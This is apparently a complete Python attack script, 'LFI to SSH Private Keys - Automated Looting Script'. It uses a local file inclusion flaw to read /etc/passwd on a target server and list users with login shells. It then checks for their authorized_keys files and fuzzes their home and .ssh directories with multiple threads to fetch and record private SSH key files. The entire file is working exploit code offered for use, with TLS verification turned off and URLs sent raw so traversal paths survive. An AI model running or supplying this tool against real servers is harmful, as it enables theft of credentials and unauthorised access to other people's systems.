#!/usr/bin/env python3
import requests
import argparse
import sys
import urllib3
import time
from requests.models import PreparedRequest
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
  _    ___ ___ ___ _  _______   _____ 
 | |  | __|_ _|_  ) |/ / __\\ \\ / / __|
 | |__| _| | | / /| ' <| _| \\ V /\\__ \\
 |____|_| |___/___|_|\\_\\___| |_| |___/
                                      
LFI to SSH Private Keys - Automated Looting Script
"""

class RawPreparedRequest(PreparedRequest):
    def prepare_url(self, url, params):
       
        self.url = url
        return self.url

class RawSession(requests.Session):
    def prepare_request(self, request):
        prep = RawPreparedRequest()
        prep.prepare(
            method=request.method,
            url=request.url,
            headers=request.headers,
            files=request.files,
            data=request.data,
            params=request.params,
            auth=request.auth,
            json=request.json,
        )
        return prep

def get_session(proxy):
    session = RawSession()
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
        print("[*] Proxy mode enabled; lowering request rate (processing candidates sequentially with 1s delay).")
    return session

def check_passwd_file(url, proxy, verbose):
    session = get_session(proxy)
    try:
        response = session.get(url, timeout=10)
        if verbose:
            print(f"[DEBUG] Received /etc/passwd response:\n{response.text[:500]}")
        lines = response.text.splitlines()
        valid_lines = [line for line in lines if ":x:" in line]
        if len(valid_lines) >= 5:
            print("[+] Valid /etc/passwd file found")
            return response.text
        print("[-] /etc/passwd file not found or invalid")
    except requests.RequestException as e:
        print(f"[-] Error fetching /etc/passwd: {e}")
    return None

def extract_active_users(passwd_content, verbose=False):
    active_users = []
    for line in passwd_content.splitlines():
        parts = line.split(":")
        if len(parts) < 7:
            continue
        username, _, _, _, _, home_dir, shell = parts
       
        if home_dir.startswith("/home/") and not shell.endswith("nologin"):
            active_users.append((username, home_dir))
    if active_users:
        print("[+] Active users exported:")
        for user, home in active_users:
            print("    {} -> {}".format(user, home))
        return active_users
    print("[-] No active users found")
    return []

def check_ssh_metadata(base_url, users, proxy, verbose=False):
    print("[+] Checking for authorized_keys ...")
    session = get_session(proxy)
    prefix = base_url.rsplit("etc/passwd", 1)[0]
    found_ssh_users = set()
    for user, home in users:
        path = f"{home}/.ssh/authorized_keys"
        payload = prefix + path.lstrip("/")
        try:
            response = session.get(payload, timeout=10)
            if response.status_code == 200 and response.text.strip():
                print(f"[!] Found authorized_keys for {user}: {payload}")
                print(f"    [*] SSH key-based authentication is enabled for user {user}.")
                found_ssh_users.add(user)
        except requests.RequestException as e:
            if verbose:
                print(f"[-] Error checking authorized_keys for {user} at {payload}: {e}")
    return found_ssh_users

def fuzz_task(user, candidate_url, session, verbose):
    try:
        response = session.get(candidate_url, timeout=10)
        if response.status_code == 200 and "PRIVATE KEY" in response.text:
            return candidate_url
    except requests.RequestException as e:
        if verbose:
            print(f"[-] Error requesting {candidate_url}: {e}")
    return None

def fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_success, verbose):
    found = []
   
    candidates = []
    for key_name in wordlist:
        candidates.append(f"{home}/.ssh/{key_name}")
        if all_flag:
            candidates.append(f"{home}/{key_name}")
   
    candidates = list(dict.fromkeys(candidates))
    
   
    if session.proxies:
        for candidate in candidates:
            candidate_url = prefix + candidate.lstrip("/")
            result = fuzz_task(user, candidate_url, session, verbose)
            if result:
                print(f"[+] Private key found for {user} at: {result}")
                found.append(result)
                if not continue_as_success:
                    break
            time.sleep(1) 
    else:
       
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_candidate = {executor.submit(fuzz_task, user, prefix + candidate.lstrip("/"), session, verbose): candidate for candidate in candidates}
            for future in as_completed(future_to_candidate):
                result = future.result()
                if result:
                    print(f"[+] Private key found for {user} at: {result}")
                    found.append(result)
                    if not continue_as_success:
                        break
    return found

def fuzz_ssh_keys_for_users(base_url, users, wordlist, proxy, all_flag, continue_as_success, verbose, found_ssh_users):
    print("[+] Starting to FUZZ")
    found_keys = []
    session = get_session(proxy)
    prefix = base_url.rsplit("etc/passwd", 1)[0]
   
    ordered_users = sorted(users, key=lambda x: 0 if x[0] in found_ssh_users else 1)
    for user, home in ordered_users:
        keys = fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_as_success, verbose)
        found_keys.extend(keys)
    return found_keys

def main():
    parser = argparse.ArgumentParser(
        description="Automated LFI to SSH private key looter",
        epilog="Common SSH private key names: https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists"
    )
    parser.add_argument("-u", "--url", required=True, help="LFI URL pointing to /etc/passwd")
    parser.add_argument("-l", "--list", required=True, help="Wordlist containing SSH private key names")
    parser.add_argument("-o", "--output", help="File to save found private key URLs", default=None)
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for debugging")
    parser.add_argument("-a", "--all", action="store_true", help="Also search the entire home directory (not just .ssh folder)")
    parser.add_argument("-c", "--continue-as-success", action="store_true",
                        help="Continue scanning all candidates for a user even after a match is found")
    args = parser.parse_args()

    print(BANNER)
    passwd_content = check_passwd_file(args.url, args.proxy, args.verbose)
    if not passwd_content:
        sys.exit("[-] Exiting due to invalid /etc/passwd response")
    active_users = extract_active_users(passwd_content, args.verbose)
    if not active_users:
        sys.exit("[-] No active users found, exiting")
   
    found_ssh_users = check_ssh_metadata(args.url, active_users, args.proxy, args.verbose)
    try:
        with open(args.list, "r") as f:
            key_wordlist = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        sys.exit(f"[-] Wordlist file '{args.list}' not found")
    found_keys = fuzz_ssh_keys_for_users(args.url, active_users, key_wordlist, args.proxy, args.all, args.continue_as_success, args.verbose, found_ssh_users)
    if args.output and found_keys:
        with open(args.output, "w") as f:
            f.write("\n".join(found_keys) + "\n")
        print(f"[+] Results saved to {args.output}")
    print("[+] Done (～￣▽￣)～")

if __name__ == "__main__":
    main()
